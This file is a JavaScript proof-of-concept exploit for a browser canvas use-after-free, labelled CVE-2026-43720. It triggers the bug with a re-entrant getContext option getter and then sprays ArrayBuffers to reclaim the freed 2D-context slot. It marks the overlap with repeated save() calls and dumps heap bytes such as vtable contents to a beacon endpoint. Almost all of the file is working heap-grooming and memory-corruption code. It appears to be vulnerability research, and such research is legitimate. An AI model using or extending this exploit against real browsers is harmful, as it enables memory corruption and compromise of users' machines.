// p465-canvas-direct-ab.js — Canvas UAF → direct AB spray (no same-type spray)
//
// V464 showed: same-type spray context NOT freed by GC (Ref chain keeps it alive).
// New approach: skip same-type spray. After UAF, context #1's slot is immediately
// free (unique_ptr deleted it). Spray ABs to reclaim, then save() to mark.
//
// CVE-2026-43720
(function() {
  var RUN = 'p465-' + Date.now().toString(36);
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag + '/' + RUN, false);
      x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
    } catch(e) {}
  }
  B('BOOT', navigator.userAgent);

  // === TEST A: Direct UAF → AB spray → save marker ===
  try {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    var inner = null, tc = 0;
    var s = {};
    Object.defineProperty(s, 'desynchronized', {
      get: function() { tc++; if (tc === 1) inner = c.getContext('2d'); return false; }
    });
    var outer = c.getContext('2d', s);

    if (!inner || inner === outer) {
      B('A-SKIP', 'no UAF: inner=' + !!inner + ' same=' + (inner === outer));
      B('DONE', RUN);
      return;
    }

    B('A-UAF', 'trigger-ok');

    // Context #1 (inner) was FREED by unique_ptr when outer was created.
    // innerCtx wraps the freed slot. Immediately spray ABs.

    // Spray a wide range of sizes. Context2D is large (has inline State + Path + bases).
    // Try sizes from 256 to 8192.
    var SIZES = [256, 320, 384, 448, 512, 576, 640, 704, 768, 896, 1024, 1280, 1536, 2048, 2560, 3072, 4096, 5120, 6144, 8192];
    var PER_SIZE = 50;
    var abPool = [];

    for (var si = 0; si < SIZES.length; si++) {
      for (var j = 0; j < PER_SIZE; j++) {
        var ab = new ArrayBuffer(SIZES[si]);
        // Zero-init by default — save() marker will be non-zero
        abPool.push({ ab: ab, size: SIZES[si], si: si, j: j });
      }
    }

    B('A-SPRAYED', { count: abPool.length, sizes: SIZES });

    // Call save() 42 times. If an AB reclaimed the slot, this writes to AB data.
    var MARKER = 42;
    var saveOk = true;
    try {
      for (var s = 0; s < MARKER; s++) inner.save();
    } catch(e) {
      saveOk = false;
      B('A-SAVE-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
    }

    B('A-SAVED', { marker: MARKER, ok: saveOk });

    if (saveOk) {
      // Scan all ABs for value 42 at every uint32 offset
      var hits = [];
      for (var pi = 0; pi < abPool.length; pi++) {
        var u32 = new Uint32Array(abPool[pi].ab);
        for (var off = 0; off < u32.length; off++) {
          if (u32[off] === MARKER) {
            var byteOff = off * 4;
            var u8 = new Uint8Array(abPool[pi].ab);

            // Read surrounding bytes as hex
            var start = Math.max(0, byteOff - 16);
            var end = Math.min(u8.length, byteOff + 20);
            var ctx = '';
            for (var ci = start; ci < end; ci++) ctx += ('0' + u8[ci].toString(16)).slice(-2);

            // First 128 bytes as hex (contains vtable, bases, etc.)
            var head = '';
            for (var ci = 0; ci < Math.min(128, u8.length); ci++) head += ('0' + u8[ci].toString(16)).slice(-2);

            hits.push({ pi: pi, size: abPool[pi].size, byteOff: byteOff, ctx: ctx, head: head });
            if (hits.length >= 5) break;
          }
        }
        if (hits.length >= 5) break;
      }

      B('A-SCAN', { hitCount: hits.length });
      for (var h = 0; h < hits.length; h++) B('A-HIT-' + h, hits[h]);

      // Confirm by incrementing again
      if (hits.length > 0) {
        try {
          inner.save();
          var u32c = new Uint32Array(abPool[hits[0].pi].ab);
          var newVal = u32c[hits[0].byteOff / 4];
          B('A-CONFIRM', { expected: MARKER + 1, actual: newVal, ok: newVal === MARKER + 1 });

          // Full dump of first 256 bytes
          var fullU8 = new Uint8Array(abPool[hits[0].pi].ab);
          for (var ch = 0; ch < 8; ch++) {
            var s = ch * 32;
            var hex = '';
            for (var ci = s; ci < Math.min(s + 32, fullU8.length); ci++) hex += ('0' + fullU8[ci].toString(16)).slice(-2);
            B('A-DUMP-' + ch, { off: s, hex: hex });
          }
        } catch(e) {
          B('A-CONFIRM-ERR', e.message.slice(0, 200));
        }
      }
    }
  } catch(e) {
    B('A-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
  }

  // === TEST B: Multiple UAFs → more freed slots → better chance of AB reclaim ===
  try {
    // Create 50 UAFs — each frees a CanvasRenderingContext2D
    var uafList = [];
    for (var u = 0; u < 50; u++) {
      var c2 = document.createElement('canvas');
      c2.width = 1; c2.height = 1;
      document.body.appendChild(c2);
      var inner2 = null, tc2 = 0;
      var s2 = {};
      Object.defineProperty(s2, 'desynchronized', {
        get: function() { tc2++; if (tc2 === 1) inner2 = c2.getContext('2d'); return false; }
      });
      c2.getContext('2d', s2);
      if (inner2) uafList.push(inner2);
    }

    B('B-UAFS', { count: uafList.length });

    // Spray ABs more aggressively
    var abPool2 = [];
    for (var si = 0; si < SIZES.length; si++) {
      for (var j = 0; j < 100; j++) {
        abPool2.push({ ab: new ArrayBuffer(SIZES[si]), size: SIZES[si], si: si, j: j });
      }
    }

    B('B-SPRAYED', { count: abPool2.length });

    // Try save() on each dangling innerCtx
    var MARKER2 = 77;
    var saveResults = [];
    for (var u = 0; u < uafList.length; u++) {
      try {
        for (var s = 0; s < MARKER2; s++) uafList[u].save();
        saveResults.push({ u: u, ok: true });
      } catch(e) {
        saveResults.push({ u: u, ok: false, err: e.message.slice(0, 50) });
      }
      if (saveResults.length >= 5 && saveResults.filter(function(r){return !r.ok;}).length > 0) break;
    }

    B('B-SAVED', { results: saveResults.slice(0, 10) });

    // Scan for marker 77
    var hits2 = [];
    for (var pi = 0; pi < abPool2.length; pi++) {
      var u32 = new Uint32Array(abPool2[pi].ab);
      for (var off = 0; off < u32.length; off++) {
        if (u32[off] === MARKER2) {
          var byteOff = off * 4;
          var u8 = new Uint8Array(abPool2[pi].ab);
          var head = '';
          for (var ci = 0; ci < Math.min(128, u8.length); ci++) head += ('0' + u8[ci].toString(16)).slice(-2);
          hits2.push({ pi: pi, size: abPool2[pi].size, byteOff: byteOff, head: head });
          if (hits2.length >= 5) break;
        }
      }
      if (hits2.length >= 5) break;
    }

    B('B-SCAN', { hitCount: hits2.length });
    for (var h = 0; h < hits2.length; h++) B('B-HIT-' + h, hits2[h]);

    // Confirm
    if (hits2.length > 0) {
      // Which UAF instance wrote to this AB?
      // Reset: call save() one more time on ALL uafs
      for (var u = 0; u < uafList.length; u++) {
        try { uafList[u].save(); } catch(e) {}
      }
      var u32c = new Uint32Array(abPool2[hits2[0].pi].ab);
      var newVal = u32c[hits2[0].byteOff / 4];
      B('B-CONFIRM', { expected: MARKER2 + 1, actual: newVal, ok: newVal === MARKER2 + 1 });
    }
  } catch(e) {
    B('B-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
  }

  // === TEST C: Spray BEFORE UAF — fill allocator, then UAF → slot reuses AB ===
  // Idea: pre-fill FastMalloc with ABs, then trigger UAF.
  // Context #1 allocation takes a FRESH slot (beyond AB spray).
  // When context #1 is freed, the slot might be at the START of a free list.
  // Next AB allocation fills that slot.
  try {
    // Phase 1: Spray ABs to fill allocator
    var preAbs = [];
    var preSize = 1024; // try one size first
    for (var i = 0; i < 500; i++) {
      preAbs.push(new ArrayBuffer(preSize));
    }

    // Phase 2: Free some ABs to create holes
    var holeAbs = preAbs.splice(200, 50);
    holeAbs = null;

    // Phase 3: Trigger UAF — context #1 might fill a hole
    var c3 = document.createElement('canvas');
    c3.width = 1; c3.height = 1;
    document.body.appendChild(c3);
    var inner3 = null, tc3 = 0;
    var s3 = {};
    Object.defineProperty(s3, 'desynchronized', {
      get: function() { tc3++; if (tc3 === 1) inner3 = c3.getContext('2d'); return false; }
    });
    c3.getContext('2d', s3);

    if (!inner3) {
      B('C-SKIP', 'no UAF');
    } else {
      // Context #1 freed. Its slot is in the free list.
      // Phase 4: Spray more ABs — one should fill the freed slot
      var postAbs = [];
      for (var i = 0; i < 200; i++) {
        var ab = new ArrayBuffer(preSize);
        postAbs.push(ab);
      }

      B('C-SPRAYED', { preCount: preAbs.length, postCount: postAbs.length, size: preSize });

      // Phase 5: save() marker
      var MARKER3 = 99;
      try {
        for (var s = 0; s < MARKER3; s++) inner3.save();
        B('C-SAVED', { marker: MARKER3, ok: true });
      } catch(e) {
        B('C-SAVED', { marker: MARKER3, ok: false, err: e.message.slice(0, 100) });
      }

      // Phase 6: Scan
      var hits3 = [];
      var allAbs = preAbs.concat(postAbs);
      for (var pi = 0; pi < allAbs.length; pi++) {
        var u32 = new Uint32Array(allAbs[pi]);
        for (var off = 0; off < u32.length; off++) {
          if (u32[off] === MARKER3) {
            hits3.push({ pi: pi, isPre: pi < preAbs.length, byteOff: off * 4 });
            if (hits3.length >= 3) break;
          }
        }
        if (hits3.length >= 3) break;
      }

      B('C-SCAN', { hitCount: hits3.length, hits: hits3 });

      if (hits3.length > 0) {
        var hitAb = allAbs[hits3[0].pi];
        var u8 = new Uint8Array(hitAb);
        var head = '';
        for (var ci = 0; ci < Math.min(128, u8.length); ci++) head += ('0' + u8[ci].toString(16)).slice(-2);
        B('C-HIT', { head: head, size: hitAb.byteLength });
      }
    }
  } catch(e) {
    B('C-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
  }

  B('ALIVE', 'all-tests-done');
  B('DONE', RUN);
})();
